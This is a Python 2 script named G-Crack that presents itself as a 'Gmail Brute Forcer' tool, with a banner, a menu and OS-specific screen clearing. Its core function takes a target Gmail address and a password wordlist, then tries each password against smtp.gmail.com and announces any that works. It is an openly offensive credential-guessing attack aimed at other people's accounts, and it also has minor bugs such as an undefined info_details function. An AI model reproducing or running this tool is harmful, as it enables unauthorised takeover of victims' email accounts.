#!/usr/bin/python

''' INFORMASI =---=

Project Number : 01
Project Name : G-Crack.py

=---= INFORMASI '''

try:
	print ""
	print " [ IMPORTING ] Importing Module : os "
	import os
	print " [ IMPORTING ] Importing Module : datetime"
	import datetime
	print " [ IMPORTING ] Importing Module : time"
	import time
	print " [ IMPORTING ] Importing Module : SMTPLIB"
	import smtplib
	print ""
	pass
except ImportError:
	print ""
	print " [ ERROR ] Error when Importing Modules ! Please check 'requirement.txt'"
	print "           to see what Modules are needed to Operate this Tools..."
	print " [ ERROR ] Maybe You are using Old version of Python...recommended version"
	print "           is Python v2.7 and Up ..."
	exit()

###################################################################################################
### CORE UTAMA =---=

waktu = datetime.datetime.now()
jam = waktu.hour
menit = waktu.minute
detik = waktu.second

error_unknown = " [ ERROR ] Unknown Error has been occured !"
error_blank = " [ ERROR ] Don't Leave it Blank !"
error_inv_num = " [ ERROR ] Invalid Number has been Selected !"

def pro_exit():
	print ""
	print " [ CLOSING ] Thanks for Using My Tools !"
	time.sleep(1)
	print " [ SHUTDOWN ] Closing Tools at {0}:{1}:{2}".format(jam,menit,detik)
	time.sleep(1)
	exit()

def envi_win():
	os.system('cls')
	os.system('mode 68,50')

def envi_linux():
	os.system('clear')

def jeda_02():
	print ""
	jeda = raw_input(" [ PAUSE ] Press 'ENTER' to Continue or type 'exit' to EXIT ...")
	if jeda == "":
		pass
	elif jeda == "exit":
		pro_exit()
	elif jeda == "Exit":
		pro_exit()
	elif jeda == "EXIT":
		pro_exit()
	else:
		print ""
		print error_unknown
		pro_exit()

def tools():
	percobaan = 0
	print " |"
	print " |---> [ Example : victim@gmail.com ]"
	target = raw_input(" |---> $ Target Gmail : ")
	if target == "":
		print ""
		print "error_blank"
		pro_exit()

	print " |"
	print " |---> [ Example : C:\MyFolder\wordlist.txt ]"
	lokasi_wordlist = raw_input(" |---> $ Wordlist Location : ")
	if lokasi_wordlist == "":
		print ""
		print error_blank
		pro_exit()

	print ""
	print " $ Opening Wordlist ..."

	try:
		buka_wordlist = open(lokasi_wordlist,'r')
	except:
		print ""
		print " [ ERROR ] Error when Opening Wordlist, Wordlist File is"
		print "           doesn't Exist or Location is Invalid, check Your"
		print "           Wordlist File or Location and Try Again ..."
		pro_exit()
	print " $ Reading Wordlist and Counting Line..."

	try:
		baca_wordlist = buka_wordlist.readlines()
		banyak_kata = str(len(baca_wordlist))
	except:
		print ""
		print " [ ERROR ] Error when Reading Wordlist ! File Size is too"
		print "           big or not a readable File"
		pro_exit()

	print " $ Connecting Device with Gmail Server ..."

	try:
		server_gmail = smtplib.SMTP_SSL('smtp.gmail.com', 465)
		server_gmail.ehlo()
	except:
		print ""
		print " [ ERROR ] Error when Connecting to Server...check Your"
		print "           Internet Connection and Try Again ..."
		pro_exit()

	print ""
	jeda = raw_input(" [#] Press 'ENTER' to Start Cracking/Attacking !!!")
	print ""

	for password in baca_wordlist:
		percobaan = percobaan+1
		print " [ {0}/{1} ] Trying Password --> {2}".format(percobaan, banyak_kata, password)
		try:
			server_gmail.login(target,password)
			print ""
			print " [#]--->>> Password Found !!! : {}".format(password)
			print ""
			jeda = raw_input( " [#] Press 'ENTER' to Close Tools ...")
			pro_exit()
		except smtplib.SMTPAuthenticationError as eror:
			error = str(eror)
			if error[14] == '<':
				print ""
				print " [#]--->>> Password Found !!! : {}".format(password)
				print ""
				jeda = raw_input( " [#] Press 'ENTER' to Close Tools ...")
				pro_exit()
			else:
				pass

	print " $ No Correct Password Found...Sorry, You can Try to use more"
	print "   more Powerful Wordlist like 'rockyou.txt' or Other Wordlist ..."
	pro_exit()

def banner():
	command_os
	print '''
####################################################################

    .d8888b.          .d8888b.                           888      
   d88P  Y88b        d88P  Y88b                          888      
   888    888        888    888                          888      
   888               888        888d888 8888b.   .d8888b 888  888
   888  88888        888        888P"      "88b d88P"    888 .88P 
   888    888 888888 888    888 888    .d888888 888      888888K  
   Y88b  d88P        Y88b  d88P 888    888  888 Y88b.    888 "88b 
    "Y8888P88         "Y8888P"  888    "Y888888  "Y8888P 888  888

  [ Gmail Brute Forcer Tools ]-=-[ Language : PYTHON 2.7 and Up ]

            --={ Created ++ Coded by SXID_CYB3R }=--         
               --={ Copyright (c) SXID_CYB3R }=--
                    --= { Version : 1.2 }=--

####################################################################

     {1}--START CRACKING
     {2}--INFO + ABOUT
     {3}--EXIT

####################################################################'''

 	tools_select = raw_input(" $ G-CRACK / Select Tools >>> ")
 	if tools_select == "":
 		print ""
 		print error_blank
 		pro_exit()
 	elif tools_select == "1":
 		tools()
 	elif tools_select == "2":
 		info_details()
 	elif tools_select == "3":
 		pro_exit()
 	else:
 		print ""
 		print error_inv_num
 		pro_exit()

### =---= CORE UTAMA
###################################################################################################

print " [#] Select Your Command Line ! [#]"
print ""
print " {1}--Terminal --------> Linux and Other"
print " {2}--Command Prompt --> Windows"
print ""
sel_jenis_os = raw_input(" $ G-CRACK / Select OS >>> ")
if sel_jenis_os == "":
	print ""
	print error_blank
	pro_exit()
elif sel_jenis_os == "1":
	command_os = envi_linux()
elif sel_jenis_os == "2":
	command_os = envi_win()
else:
	print ""
	print error_inv_num
	pro_exit()

banner()